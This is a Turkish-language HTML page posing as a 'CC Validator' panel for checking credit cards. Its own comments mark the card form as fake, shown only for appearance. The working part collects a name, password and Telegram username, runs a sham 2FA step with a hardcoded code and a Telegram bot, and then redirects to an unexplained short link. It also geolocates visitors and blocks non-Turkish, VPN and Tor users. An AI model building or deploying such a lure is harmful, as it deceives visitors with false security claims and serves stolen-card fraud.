<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>CC Checker | Professional Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0e1a 0%, #0f1117 100%);
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        /* Arka plan animasyonlu partiküller */
        .particle {
            position: fixed;
            width: 4px;
            height: 4px;
            background: rgba(79, 158, 255, 0.3);
            border-radius: 50%;
            pointer-events: none;
            animation: float 8s infinite ease-in-out;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) translateX(0px); opacity: 0.3; }
            50% { transform: translateY(-50px) translateX(30px); opacity: 0.8; }
        }

        .container {
            max-width: 500px;
            width: 100%;
            position: relative;
            z-index: 10;
        }

        /* Header */
        .header {
            text-align: center;
            margin-bottom: 30px;
            animation: fadeInDown 0.8s ease;
        }

        .logo {
            font-size: 42px;
            font-weight: 800;
            background: linear-gradient(135deg, #c0e0ff, #4f9eff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -1px;
            margin-bottom: 8px;
        }

        .badge {
            display: inline-block;
            background: rgba(79, 158, 255, 0.12);
            padding: 6px 14px;
            border-radius: 40px;
            font-size: 11px;
            color: #4f9eff;
            border: 1px solid rgba(79, 158, 255, 0.3);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.7; }
            50% { opacity: 1; }
        }

        /* Ana Kart */
        .card {
            background: rgba(22, 28, 44, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 32px;
            border: 1px solid rgba(42, 52, 72, 0.6);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            animation: fadeInUp 0.8s ease;
        }

        @keyframes fadeInDown {
            from { opacity: 0; transform: translateY(-30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Sahte CC Checker alanı */
        .fake-checker {
            background: rgba(15, 22, 34, 0.6);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 24px;
            border: 1px solid #253450;
        }

        .fake-title {
            display: flex;
            justify-content: space-between;
            margin-bottom: 16px;
            padding-bottom: 12px;
            border-bottom: 1px solid #253450;
        }

        .fake-title span:first-child {
            font-weight: 600;
            color: #e2e8f0;
        }

        .fake-title span:last-child {
            font-size: 11px;
            color: #2dd4bf;
        }

        .input-row {
            display: flex;
            gap: 12px;
            margin-bottom: 16px;
        }

        .input-row input {
            flex: 1;
            background: #0f1622;
            border: 1px solid #2b354c;
            padding: 12px;
            border-radius: 16px;
            color: #f0f3fa;
            font-size: 13px;
        }

        .fake-btn {
            background: linear-gradient(105deg, #1f6392, #2a75a8);
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 24px;
            color: white;
            font-weight: 600;
            cursor: not-allowed;
            opacity: 0.6;
        }

        /* Gerçek Auth Alanı */
        .auth-area {
            margin-top: 24px;
            padding-top: 24px;
            border-top: 1px solid #253450;
        }

        .input-group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-size: 12px;
            font-weight: 500;
            color: #9aa5c0;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            background: #0f1622;
            border: 1px solid #2b354c;
            padding: 14px 18px;
            border-radius: 24px;
            font-size: 14px;
            color: #f0f3fa;
            outline: none;
            transition: 0.2s;
        }

        input:focus {
            border-color: #4f9eff;
            box-shadow: 0 0 0 3px rgba(79, 158, 255, 0.1);
        }

        button {
            background: linear-gradient(105deg, #1f6392, #2a75a8);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 40px;
            font-weight: 600;
            font-size: 15px;
            color: white;
            margin-top: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        button:hover {
            transform: scale(0.98);
            background: linear-gradient(105deg, #2a75a8, #3a85b8);
        }

        button:active {
            transform: scale(0.96);
        }

        .ripple {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.5);
            transform: scale(0);
            animation: ripple 0.6s linear;
            pointer-events: none;
        }

        @keyframes ripple {
            to { transform: scale(4); opacity: 0; }
        }

        .info-box {
            background: rgba(16, 22, 36, 0.8);
            padding: 14px;
            border-radius: 20px;
            margin-bottom: 20px;
            font-size: 12px;
            text-align: center;
            color: #b9c7db;
            border: 1px solid #253450;
        }

        .bot-link {
            display: inline-block;
            background: #2a75a8;
            color: white;
            text-decoration: none;
            padding: 12px 24px;
            border-radius: 40px;
            font-size: 14px;
            font-weight: 600;
            margin-top: 12px;
            transition: 0.2s;
        }

        .bot-link:hover {
            background: #3a85b8;
            transform: scale(1.02);
        }

        .error-msg {
            font-size: 12px;
            margin-top: 10px;
            text-align: center;
            color: #f97316;
        }

        .success-msg {
            font-size: 12px;
            margin-top: 10px;
            text-align: center;
            color: #2dd4bf;
        }

        /* Animasyonlu başarı mesajı */
        .success-animation {
            text-align: center;
            margin-top: 16px;
            animation: bounce 0.5s ease;
        }

        @keyframes bounce {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }

        .hidden {
            display: none;
        }

        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .footer {
            text-align: center;
            margin-top: 24px;
            font-size: 10px;
            color: #4a5a7a;
        }

        .live-badge {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(45, 212, 191, 0.1);
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 10px;
            color: #2dd4bf;
            border: 1px solid rgba(45, 212, 191, 0.2);
            backdrop-filter: blur(4px);
            animation: pulse 2s infinite;
            z-index: 100;
        }
    </style>
</head>
<body>

<!-- Arka plan partikülleri -->
<script>
    for (let i = 0; i < 30; i++) {
        let particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.top = Math.random() * 100 + '%';
        particle.style.animationDelay = Math.random() * 8 + 's';
        particle.style.animationDuration = 5 + Math.random() * 5 + 's';
        document.body.appendChild(particle);
    }
</script>

<div class="container">
    <div class="header">
        <div class="logo">⚡ CC VALIDATOR</div>
        <div class="badge">● SECURE CONNECTION ● LIVE</div>
    </div>

    <div class="card">
        <!-- Sahte CC Checker (görünüm için) -->
        <div class="fake-checker">
            <div class="fake-title">
                <span>💳 Kart Doğrulama</span>
                <span>🟢 AKTİF</span>
            </div>
            <div class="input-row">
                <input type="text" placeholder="4242 4242 4242 4242" disabled>
            </div>
            <div class="input-row">
                <input type="text" placeholder="12/28" disabled>
                <input type="text" placeholder="123" disabled>
            </div>
            <button class="fake-btn" disabled>🔍 Kart Doğrula</button>
            <div style="font-size: 11px; color: #5b6e8c; text-align: center; margin-top: 12px;">
                🔐 Sistem erişimi için giriş yapın
            </div>
        </div>

        <!-- Gerçek Kayıt/Giriş Alanı -->
        <div class="auth-area">
            <div class="info-box">
                🚀 2FA DOĞRULAMA ZORUNLUDUR<br>
                Bilgilerinizi eksiksiz girin
            </div>

            <div class="input-group">
                <label>👤 Ad Soyad</label>
                <input type="text" id="fullname" placeholder="Ad Soyad">
            </div>
            <div class="input-group">
                <label>🔐 Şifre</label>
                <input type="password" id="password" placeholder="••••••">
            </div>
            <div class="input-group">
                <label>📱 Telegram Kullanıcı Adı</label>
                <input type="text" id="telegramUser" placeholder="@kullaniciadi">
            </div>

            <button id="sendCodeBtn">📲 2FA Kodu Gönder</button>
            <div id="loginError" class="error-msg"></div>

            <!-- Kod girme alanı (başta gizli) -->
            <div id="verifyArea" style="display: none; margin-top: 20px;">
                <div class="info-box" id="verifyInfo">
                    🤖 <a href="https://t.me/ZazaChecker2fa_bot" target="_blank" id="botLinkBtn" style="color:#4f9eff; text-decoration:none">@ZazaChecker2fa_bot</a> adresine gidin<br>
                    <span style="font-size: 20px; font-weight: bold; display: block; margin: 10px 0;">⬇️</span>
                    Bot size <strong style="color:#2dd4bf">385217</strong> kodunu verecek
                </div>
                <div class="input-group">
                    <label>🔢 2FA Kodu</label>
                    <input type="text" id="verifyCode" placeholder="385217" maxlength="6">
                </div>
                <button id="doVerifyBtn">✅ Doğrula ve Giriş Yap</button>
                <div id="verifyMsg" class="error-msg"></div>
            </div>
        </div>
    </div>
    <div class="footer">
        🔒 256-bit SSL · TLS 1.3 · Güvenli Ödeme Sistemleri
    </div>
</div>
<div class="live-badge">
    🟢 SİSTEM AKTİF
</div>

<script>
    // Sabit kod
    const VERIFY_CODE = "385217";
    const BOT_USERNAME = "ZazaChecker2fa_bot";
    const BOT_LINK = `https://t.me/${BOT_USERNAME}`;

    let pendingName = "", pendingPass = "", pendingTg = "";

    // Ripple efekti
    function addRipple(button, event) {
        const rect = button.getBoundingClientRect();
        const ripple = document.createElement('span');
        ripple.className = 'ripple';
        ripple.style.left = (event.clientX - rect.left) + 'px';
        ripple.style.top = (event.clientY - rect.top) + 'px';
        button.appendChild(ripple);
        setTimeout(() => ripple.remove(), 600);
    }

    // Bot linkine yönlendir ve kod girme alanını göster
    document.getElementById("sendCodeBtn").onclick = async (e) => {
        addRipple(e.target, e);
        
        const name = document.getElementById("fullname").value.trim();
        const pass = document.getElementById("password").value;
        const tg = document.getElementById("telegramUser").value.trim();
        const msgDiv = document.getElementById("loginError");

        if (!name || !pass || !tg) {
            msgDiv.innerText = "❌ Tüm alanları doldurun";
            return;
        }
        if (!tg.startsWith("@")) {
            msgDiv.innerText = "❌ Telegram kullanıcı adı @ ile başlamalı";
            return;
        }
        if (pass.length < 4) {
            msgDiv.innerText = "❌ Şifre en az 4 karakter olmalı";
            return;
        }

        pendingName = name;
        pendingPass = pass;
        pendingTg = tg;

        msgDiv.innerHTML = "⏳ <span class='loading-spinner'></span> Yönlendiriliyor...";
        
        // Bot linkine yönlendir (yeni sekmede aç)
        window.open(BOT_LINK, '_blank');
        
        setTimeout(() => {
            msgDiv.innerHTML = "";
            document.getElementById("verifyArea").style.display = "block";
            document.getElementById("verifyInfo").innerHTML = `
                🤖 <a href="${BOT_LINK}" target="_blank" style="color:#4f9eff; text-decoration:none">@${BOT_USERNAME}</a> adresine gidin<br>
                <span style="font-size: 20px; font-weight: bold; display: block; margin: 10px 0;">⬇️</span>
                Bot size <strong style="color:#2dd4bf">${VERIFY_CODE}</strong> kodunu verecek
            `;
            document.getElementById("verifyCode").value = "";
        }, 1000);
    };

    // Kodu doğrula ve giriş yap
    document.getElementById("doVerifyBtn").onclick = async (e) => {
        addRipple(e.target, e);
        
        const code = document.getElementById("verifyCode").value.trim();
        const msgDiv = document.getElementById("verifyMsg");

        if (!code) {
            msgDiv.innerText = "❌ Kodu girin";
            return;
        }

        msgDiv.innerHTML = "⏳ <span class='loading-spinner'></span> Doğrulanıyor...";

        setTimeout(() => {
            if (code === VERIFY_CODE) {
                msgDiv.style.color = "#2dd4bf";
                msgDiv.innerHTML = "✅ GİRİŞ BAŞARILI!";
                
                // Başarı animasyonu
                const successDiv = document.createElement('div');
                successDiv.className = 'success-animation';
                successDiv.innerHTML = `
                    <div style="background: rgba(45, 212, 191, 0.15); padding: 16px; border-radius: 20px; margin-top: 16px;">
                        <span style="font-size: 40px;">✅</span><br>
                        <strong style="color:#2dd4bf">HOŞ GELDİNİZ!</strong><br>
                        <span style="font-size: 12px;">Kart doğrulama sistemine yönlendiriliyorsunuz...</span>
                    </div>
                `;
                document.querySelector(".auth-area").appendChild(successDiv);
                
                setTimeout(() => {
                    window.location.href = "https://2no.co/VisualbasicChat";
                }, 2000);
            } else {
                msgDiv.style.color = "#f97316";
                msgDiv.innerHTML = "❌ Hatalı 2FA kodu! Tekrar deneyin.";
            }
        }, 800);
    };

    // IP kontrolü (Türkiye değilse engelle)
    fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            if (data.country_code !== "TR") {
                document.body.innerHTML = `
                    <div style="text-align:center;padding:80px;background:#0a0e1a;color:white;min-height:100vh">
                        <h1 style="color:#f97316">🌍 Erişim Engellendi</h1>
                        <p>Bu hizmet yalnızca Türkiye'den kullanılabilir.</p>
                        <p>IP: ${data.ip} (${data.country_name})</p>
                        <p>VPN veya proxy kullanmayın.</p>
                    </div>
                `;
            }
            if (data.proxy === true || data.hosting === true || data.tor === true) {
                document.body.innerHTML = `
                    <div style="text-align:center;padding:80px;background:#0a0e1a;color:white;min-height:100vh">
                        <h1 style="color:#f97316">🔒 VPN/Proxy Kullanımı</h1>
                        <p>VPN veya proxy ile erişim engellenmiştir.</p>
                        <p>IP: ${data.ip}</p>
                    </div>
                `;
            }
        })
        .catch(() => {});
</script>
</body>
</html>
